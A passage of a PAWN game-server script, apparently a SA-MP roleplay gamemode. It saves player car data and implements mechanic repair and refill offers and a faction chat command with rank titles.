                SaveKonVal(OwnableCarOffer[playerid], "cMod1_2", PINFO[OwnableCarOffer[playerid]][cMod1_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod3_2", PINFO[OwnableCarOffer[playerid]][cMod3_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod4_2", PINFO[OwnableCarOffer[playerid]][cMod4_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod5_2", PINFO[OwnableCarOffer[playerid]][cMod5_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod6_2", PINFO[OwnableCarOffer[playerid]][cMod6_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod7_2", PINFO[OwnableCarOffer[playerid]][cMod7_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod8_2", PINFO[OwnableCarOffer[playerid]][cMod8_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod9_2", PINFO[OwnableCarOffer[playerid]][cMod9_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod10_2", PINFO[OwnableCarOffer[playerid]][cMod10_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod11_2", PINFO[OwnableCarOffer[playerid]][cMod11_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod12_2", PINFO[OwnableCarOffer[playerid]][cMod12_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod13_2", PINFO[OwnableCarOffer[playerid]][cMod13_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod14_2", PINFO[OwnableCarOffer[playerid]][cMod14_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod15_2", PINFO[OwnableCarOffer[playerid]][cMod15_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod16_2", PINFO[OwnableCarOffer[playerid]][cMod16_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cMod17_2", PINFO[OwnableCarOffer[playerid]][cMod17_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "gLocationX_2", PINFO[OwnableCarOffer[playerid]][gLocationX_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "gLocationY_2", PINFO[OwnableCarOffer[playerid]][gLocationY_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "gLocationZ_2", PINFO[OwnableCarOffer[playerid]][gLocationZ_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "gAngle_2", PINFO[OwnableCarOffer[playerid]][gAngle_2]);
                SaveKonVal(OwnableCarOffer[playerid], "gParked_2", PINFO[OwnableCarOffer[playerid]][gParked_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cPaintJob_2", PINFO[OwnableCarOffer[playerid]][cPaintJob_2]);
                SaveKonFloat(OwnableCarOffer[playerid], "cKilo_2", PINFO[OwnableCarOffer[playerid]][cKilo_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cPanel_2", PINFO[OwnableCarOffer[playerid]][cPanel_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cDoors_2", PINFO[OwnableCarOffer[playerid]][cDoors_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cLights_2", PINFO[OwnableCarOffer[playerid]][cLights_2]);
                SaveKonVal(OwnableCarOffer[playerid], "cTires_2", PINFO[OwnableCarOffer[playerid]][cTires_2]);
                SaveKonVal(OwnableCarOffer[playerid], "pCar_2", PINFO[OwnableCarOffer[playerid]][pCar_2]);
                //
                SaveKonFloat(playerid, "cLocationx", PINFO[playerid][cLocationx]);
                SaveKonFloat(playerid, "cLocationy", PINFO[playerid][cLocationy]);
                SaveKonFloat(playerid, "cLocationz", PINFO[playerid][cLocationz]);
                SaveKonFloat(playerid, "cAngle", PINFO[playerid][cAngle]);
                SaveKonVal(playerid, "cColor1", PINFO[playerid][cColor1]);
                SaveKonVal(playerid, "cColor2", PINFO[playerid][cColor2]);
                SaveKonVal(playerid, "cModel", PINFO[playerid][cModel]);
                SaveKonVal(playerid, "cPrice", PINFO[playerid][cPrice]);
                SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
                SaveKonVal(playerid, "cLock", PINFO[playerid][cLock]);
                SaveKonVal(playerid, "cDestroyed", PINFO[playerid][cDestroyed]);
                SaveKonVal(playerid, "cFixed", PINFO[playerid][cFixed]);
                SaveKonVal(playerid, "cInsurance", PINFO[playerid][cInsurance]);
                SaveKonVal(playerid, "cFuel", PINFO[playerid][cFuel]);
                SaveKonFloat(playerid, "cHealth", PINFO[playerid][cHealth]);
                SaveKonVal(playerid, "cMod1", PINFO[playerid][cMod1]);
                SaveKonVal(playerid, "cMod3", PINFO[playerid][cMod3]);
                SaveKonVal(playerid, "cMod4", PINFO[playerid][cMod4]);
                SaveKonVal(playerid, "cMod5", PINFO[playerid][cMod5]);
                SaveKonVal(playerid, "cMod6", PINFO[playerid][cMod6]);
                SaveKonVal(playerid, "cMod7", PINFO[playerid][cMod7]);
                SaveKonVal(playerid, "cMod8", PINFO[playerid][cMod8]);
                SaveKonVal(playerid, "cMod9", PINFO[playerid][cMod9]);
                SaveKonVal(playerid, "cMod10", PINFO[playerid][cMod10]);
                SaveKonVal(playerid, "cMod11", PINFO[playerid][cMod11]);
                SaveKonVal(playerid, "cMod12", PINFO[playerid][cMod12]);
                SaveKonVal(playerid, "cMod13", PINFO[playerid][cMod13]);
                SaveKonVal(playerid, "cMod14", PINFO[playerid][cMod14]);
                SaveKonVal(playerid, "cMod15", PINFO[playerid][cMod15]);
                SaveKonVal(playerid, "cMod16", PINFO[playerid][cMod16]);
                SaveKonVal(playerid, "cMod17", PINFO[playerid][cMod17]);
                SaveKonFloat(playerid, "gLocationX", PINFO[playerid][gLocationX]);
                SaveKonFloat(playerid, "gLocationY", PINFO[playerid][gLocationY]);
                SaveKonFloat(playerid, "gLocationZ", PINFO[playerid][gLocationZ]);
                SaveKonFloat(playerid, "gAngle", PINFO[playerid][gAngle]);
                SaveKonVal(playerid, "gParked", PINFO[playerid][gParked]);
                SaveKonVal(playerid, "cPaintJob", PINFO[playerid][cPaintJob]);
                SaveKonFloat(playerid, "cKilo", PINFO[playerid][cKilo]);
                SaveKonVal(playerid, "cPanel", PINFO[playerid][cPanel]);
                SaveKonVal(playerid, "cDoors", PINFO[playerid][cDoors]);
                SaveKonVal(playerid, "cLights", PINFO[playerid][cLights]);
                SaveKonVal(playerid, "cTires", PINFO[playerid][cTires]);
                SaveKonVal(playerid, "pCar", PINFO[playerid][pCar]);
                //
                SaveKonFloat(playerid, "cLocationx_2", PINFO[playerid][cLocationx_2]);
                SaveKonFloat(playerid, "cLocationy_2", PINFO[playerid][cLocationy_2]);
                SaveKonFloat(playerid, "cLocationz_2", PINFO[playerid][cLocationz_2]);
                SaveKonFloat(playerid, "cAngle_2", PINFO[playerid][cAngle_2]);
                SaveKonVal(playerid, "cColor1_2", PINFO[playerid][cColor1_2]);
                SaveKonVal(playerid, "cColor2_2", PINFO[playerid][cColor2_2]);
                SaveKonVal(playerid, "cModel_2", PINFO[playerid][cModel_2]);
                SaveKonVal(playerid, "cPrice_2", PINFO[playerid][cPrice_2]);
                SaveKonStr(playerid, "cPlate_2", PINFO[playerid][cPlate_2]);
                SaveKonVal(playerid, "cLock_2", PINFO[playerid][cLock_2]);
                SaveKonVal(playerid, "cDestroyed_2", PINFO[playerid][cDestroyed_2]);
                SaveKonVal(playerid, "cFixed_2", PINFO[playerid][cFixed_2]);
                SaveKonVal(playerid, "cInsurance_2", PINFO[playerid][cInsurance_2]);
                SaveKonVal(playerid, "cFuel_2", PINFO[playerid][cFuel_2]);
                SaveKonFloat(playerid, "cHealth_2", PINFO[playerid][cHealth_2]);
                SaveKonVal(playerid, "cMod1_2", PINFO[playerid][cMod1_2]);
                SaveKonVal(playerid, "cMod3_2", PINFO[playerid][cMod3_2]);
                SaveKonVal(playerid, "cMod4_2", PINFO[playerid][cMod4_2]);
                SaveKonVal(playerid, "cMod5_2", PINFO[playerid][cMod5_2]);
                SaveKonVal(playerid, "cMod6_2", PINFO[playerid][cMod6_2]);
                SaveKonVal(playerid, "cMod7_2", PINFO[playerid][cMod7_2]);
                SaveKonVal(playerid, "cMod8_2", PINFO[playerid][cMod8_2]);
                SaveKonVal(playerid, "cMod9_2", PINFO[playerid][cMod9_2]);
                SaveKonVal(playerid, "cMod10_2", PINFO[playerid][cMod10_2]);
                SaveKonVal(playerid, "cMod11_2", PINFO[playerid][cMod11_2]);
                SaveKonVal(playerid, "cMod12_2", PINFO[playerid][cMod12_2]);
                SaveKonVal(playerid, "cMod13_2", PINFO[playerid][cMod13_2]);
                SaveKonVal(playerid, "cMod14_2", PINFO[playerid][cMod14_2]);
                SaveKonVal(playerid, "cMod15_2", PINFO[playerid][cMod15_2]);
                SaveKonVal(playerid, "cMod16_2", PINFO[playerid][cMod16_2]);
                SaveKonVal(playerid, "cMod17_2", PINFO[playerid][cMod17_2]);
                SaveKonFloat(playerid, "gLocationX_2", PINFO[playerid][gLocationX_2]);
                SaveKonFloat(playerid, "gLocationY_2", PINFO[playerid][gLocationY_2]);
                SaveKonFloat(playerid, "gLocationZ_2", PINFO[playerid][gLocationZ_2]);
                SaveKonFloat(playerid, "gAngle_2", PINFO[playerid][gAngle_2]);
                SaveKonVal(playerid, "gParked_2", PINFO[playerid][gParked_2]);
                SaveKonVal(playerid, "cPaintJob_2", PINFO[playerid][cPaintJob_2]);
                SaveKonFloat(playerid, "cKilo_2", PINFO[playerid][cKilo_2]);
                SaveKonVal(playerid, "cPanel_2", PINFO[playerid][cPanel_2]);
                SaveKonVal(playerid, "cDoors_2", PINFO[playerid][cDoors_2]);
                SaveKonVal(playerid, "cLights_2", PINFO[playerid][cLights_2]);
                SaveKonVal(playerid, "cTires_2", PINFO[playerid][cTires_2]);
                SaveKonVal(playerid, "pCar_2", PINFO[playerid][pCar_2]);
                //
                OnSellCar[OwnableCarOffer[playerid]] = INVALID_PLAYER_ID;
                OwnableCarMethod[playerid] = 0;OwnableCarOffer[playerid] = INVALID_PLAYER_ID; OwnableCarID[playerid] = 0; OwnableCarPrice[playerid] = 0;
                return 1;
            }
            else if(strcmp(x_job,"repair",true) == 0)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept repair [playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_LIGHTRED,"You are not a vehicle.");
                if(PlayerInfo[giveplayerid][pJob] == 7 && RepairOffer[playerid] == giveplayerid)
                {
                    if(GetPlayerPool(playerid) > RepairPrice[playerid])
                    {
                        if(IsPlayerInAnyVehicle(playerid))
                        {
                        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) { SCM(playerid,COLOR_LIGHTBLUE,"You are not the driver of vehicle"); return 1; }
                            if(IsPlayerConnected(RepairOffer[playerid]))
                            {
                            if(EngineSTATE[GetPlayerVehicleID(playerid)] == 1) { SCM(playerid,COLOR_LIGHTBLUE,"First Engine off your vehicle"); return 1; }
                            if(giveplayerid == playerid) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot accept yourself");
                                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                RepairCar[playerid] = GetPlayerVehicleID(playerid);
                                SetVehicleHealthEx(RepairCar[playerid], 1000.0);
                                RepairVehicleEx(RepairCar[playerid]);
                                format(string, sizeof(string), "** You repaired your car for $%d by Car Mechanic %s.",RepairPrice[playerid],giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "** You fixed %s's car for $%d.",sendername,RepairPrice[playerid]);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                if(PINFO[giveplayerid][pMechSkill])
                                {
                                    PlayerInfo[giveplayerid][pMechSkill] ++;
                                    SaveKonVal(giveplayerid, "pMechSkill", PINFO[giveplayerid][pMechSkill]);
                                }
                                if(PlayerInfo[giveplayerid][pMechSkill] == 50)
                                { SendClientMessage(giveplayerid, COLOR_YELLOW, "Your Car Mechanic Skill is now Level 2, you can add more Fuel to any Players Cars."); }
                                else if(PlayerInfo[giveplayerid][pMechSkill] == 100)
                                { SendClientMessage(giveplayerid, COLOR_YELLOW, "Your Car Mechanic Skill is now Level 3, you can add more Fuel to any Players Cars."); }
                                else if(PlayerInfo[giveplayerid][pMechSkill] == 200)
                                { SendClientMessage(giveplayerid, COLOR_YELLOW, "Your Car Mechanic Skill is now Level 4, you can add more Fuel to any Players Cars."); }
                                else if(PlayerInfo[giveplayerid][pMechSkill] == 400)
                                { SendClientMessage(giveplayerid, COLOR_YELLOW, "Your Car Mechanic Skill is now Level 5, you can add more Fuel to any Players Cars."); }
                                GivePlayerPool(giveplayerid, RepairPrice[playerid]);
                                GivePlayerPool(playerid, -RepairPrice[playerid]);
                                RepairOffer[playerid] = INVALID_PLAYER_ID;
                                RepairPrice[playerid] = 0;
                                PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
                                PlayerPlaySound(giveplayerid,1133,0.0,0.0,0.0);
                                return 1;
                            }
                            return 1;
                        }
                        return 1;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "Invalid player ID.");
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "No-one offerd you to Repair your Car !");
                    return 1;
                }
            }
            else { return 1; }
        }
        return 1;
    }
    if(strcmp(cmd, "/refill", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] != 7)
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are not a Car Mechanic.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /refill [playerid/PartOfName] [price]");
                return 1;
            }
            new playa;
            new money;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            money = strval(tmp);
            if(money < 1 || money > 50) { SendClientMessage(playerid, COLOR_GREY, "Price not lower than $1, or above $50!"); return 1; }
            if(IsPlayerConnected(playa))
            {
                if(playa != INVALID_PLAYER_ID)
                {
                 if(GetPlayerState(playa) != PLAYER_STATE_DRIVER) { SCM(playerid,COLOR_LIGHTBLUE,"That player is not the driver of vehicle"); return 1; }
                    if(ProxDetectorS(8.0, playerid, playa)&& IsPlayerInAnyVehicle(playa))
                    {
                    if(RefillOffer[playa] == playerid) { SCM(playerid,COLOR_BLUE, "You already offerd to this player!!"); return 1; }
                        if(playa == playerid) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't refill yourself."); return 1; }
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "You offerd %s to refill his car for $%d .",giveplayer,money);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "Car Mechanic %s wants to refill your car for $%d, (type /accept refill %d) to accept.",sendername,money,playerid);
                        SendClientMessage(playa, COLOR_LIGHTBLUE, string);
                        RefillOffer[playa] = playerid;
                        RefillPrice[playa] = money;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "That player is not near you / not in a car.");
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "That player is offline.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/repair", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] != 7)
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are not a Car Mechanic.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /repair [playerid/PartOfName] [price]");
                return 1;
            }
            new playa;
            new money;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            money = strval(tmp);
            if(money < 1 || money > 50) { SendClientMessage(playerid, COLOR_GREY, "Price not lower than $1, or above $50!"); return 1; }
            if(IsPlayerConnected(playa))
            {
                if(playa != INVALID_PLAYER_ID)
                {
       if(GetPlayerState(playa) != PLAYER_STATE_DRIVER) { SCM(playerid,COLOR_LIGHTBLUE,"That player is not the driver of vehicle"); return 1; }
                    if(ProxDetectorS(8.0, playerid, playa)&& IsPlayerInAnyVehicle(playa))
                    {
                    if(RepairOffer[playa] == playerid) { SCM(playerid,COLOR_BLUE, "You already offerd to this player!"); return 1; }
                        if(playa == playerid) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't Repair yourself."); return 1; }
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "You offerd %s to fix his car for $%d .",giveplayer,money);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "Car Mechanic %s wants to repair your car for $%d, (type /accept repair %d) to accept.",sendername,money,playerid);
                        SendClientMessage(playa, COLOR_LIGHTBLUE, string);
                        RepairOffer[playa] = playerid;
                        RepairPrice[playa] = money;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "That player is not near you / not in a car.");
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "That player is offline.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/family", true) == 0 || strcmp(cmd, "/f", true) == 0 || strcmp(cmd, "/fc", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
   new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/f)action [faction chat]");
                return 1;
            }
            if (PlayerInfo[playerid][pLeader] > 0 || PlayerInfo[playerid][pMember] > 0 ||  PlayerInfo[playerid][pClan] > 0)
            {
                new leader = PlayerInfo[playerid][pLeader];
                new member = PlayerInfo[playerid][pMember];
 //              new clan = PlayerInfo[playerid][pClan];
//                new crank = PlayerInfo[playerid][pcRank];
                if(member==1)
                {
                    return 1;
                }
                if(member==2)
                {
                    return 1;
                }
                if(member==3)
                {
                    return 1;
                }
                if(member==4)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Chief Fireman/Paramedic %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Paramedic Field %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Ambulance Commander %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Paramedic in charge %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Fire Paramedic %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Candidate Fire Paramedic %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Private %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                if(member==5)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Don Silence Mafia %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Consigliere %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Vicario %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Caporegime %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Sgarrista %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Soldato %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (( Piccioto %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Piccioto %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                if(member==6)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Don The Killers %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Consigliere %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Vicario %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Caporegime %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Sgarrista %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Soldato %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (( Piccioto %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Piccioto %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==7)
                {
                    return 1;
                }
                else if(member==8)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Director %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Co-Director %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Vice-Director %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Special Agent %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Agent %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Marksman %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (( Freelancer %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Freelancer %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==9)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Network Producer %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Network Editor %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Network Anchor %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Local Editor %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Local Reporter %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Intern %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Intern %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==10)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Taxi Company Owner %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Shift Supervisor %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Dispatcher %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Cabbie %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Taxi Rookie %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Trainee %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Trainee %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==11)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Boss %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Under Boss %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Manager %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Senior Instructor %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Instructor %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Trainee %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Trainee %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==12)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Don Dangerous Tigers %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Consigliere %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Vicario %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Caporegime %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Sgarrista %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Soldato %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (( Piccioto %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Piccioto %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==13)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Don Legendary Men %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Consigliere %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Vicario %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Caporegime %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Sgarrista %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Soldato %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (( Piccioto %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Piccioto %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==14)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( FNF Leader %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Consigliere %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Vicario %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Caporegime %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Sgarrista %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Soldato %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (( Piccioto %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( Piccioto %s: %s )) **", sendername, result); }
                    SendFamilyMessage(PlayerInfo[playerid][pMember], 0x01FCFFC8, string);
                }
                else if(member==15)
                {
                    if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "** (( Don Storm Men %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (( Consigliere %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (( Vicario %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (( Caporegime %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (( Sgarrista %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (( Soldato %s: %s ))  **", sendername, result); }
